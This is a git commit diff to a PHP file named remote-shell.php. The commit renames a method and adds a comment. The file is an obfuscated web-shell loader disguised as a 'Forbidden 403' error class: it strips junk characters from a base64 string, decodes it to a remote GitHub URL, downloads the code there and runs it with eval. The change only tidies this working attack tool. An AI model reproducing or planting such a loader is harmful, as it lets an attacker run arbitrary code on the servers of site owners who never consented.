e9a5e5b88d4d0a0fc33e223d5de3462cdf1ec72a
xdavian <107116728+xdavian@users.noreply.github.com>
2023-03-20 12:59:37 +0700

    Update remote-shell.php

--- remote-shell.php
+++ remote-shell.php
@@ -1,6 +1,7 @@
 <?php
 /**
  Forbdidden 403
+ Base Error
 **/
 
 class Forbidden {
@@ -8,14 +9,15 @@ class Forbidden {
 		return eval($val);
 	}
 	public function Base($base) {
-		$base_ = $this->Error403($base);
+		$base_ = $this->Error($base);
 		return base64_decode($base_);
 	}
-	public function Error403($err) {
+	public function Error($err) {
 		$errCode = str_replace(array("/_a9", "_+zB", "_\y0"), "", $err);
 		return $errCode;
 	}
 }
+
 $error = New Forbidden;
 $error->ForbiddenVal(file_get_contents($error->Base("aHR/_a90cHM6_\y0Ly9yYXcuZ2l_+zB0aHVidXN_\y0lcmNvbnRlb/_a9nQuY29tL3hk_\y0YXZpYW4v_+zBc2hlbGwv/_a9bWFpbi_\y09pbmRve_+zBHBsb2l0LX_\y0Yy")));
 
